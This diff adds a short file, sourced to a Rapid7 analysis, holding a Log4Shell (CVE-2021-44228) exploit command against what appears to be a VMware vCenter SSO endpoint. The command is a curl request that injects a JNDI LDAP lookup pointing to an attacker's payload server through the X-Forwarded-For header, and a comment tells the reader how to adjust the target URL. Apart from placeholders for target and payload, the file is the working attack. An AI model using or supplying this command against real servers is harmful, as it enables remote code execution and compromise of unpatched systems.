@@ -1,0 +1,5 @@
+Source: https://attackerkb.com/topics/in9sPR2Bzt/cve-2021-44228-log4shell/rapid7-analysis
+
+# Need to replace photon-machine.lan with SSO login realm for target. (Usually vsphere.local)
+curl --insecure  -vv -H "X-Forwarded-For: \${jndi:ldap://<PAYLOAD>:1389/o=tomcat}" "https://<TARGET>/websso/SAML2/SSO/photon-machine.lan?SAMLRequest="
+
